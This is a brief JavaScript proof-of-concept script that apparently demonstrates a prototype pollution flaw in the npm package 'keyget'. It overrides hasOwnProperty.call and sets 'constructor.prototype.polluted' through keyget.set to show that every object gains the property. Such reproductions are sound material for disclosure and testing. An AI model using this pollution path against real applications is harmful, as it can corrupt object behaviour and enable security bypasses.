Object.prototype.hasOwnProperty.call = () => true;
var keyget = require('keyget');
var obj = {};
console.log({}.polluted);
keyget.set({}, 'constructor.prototype.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');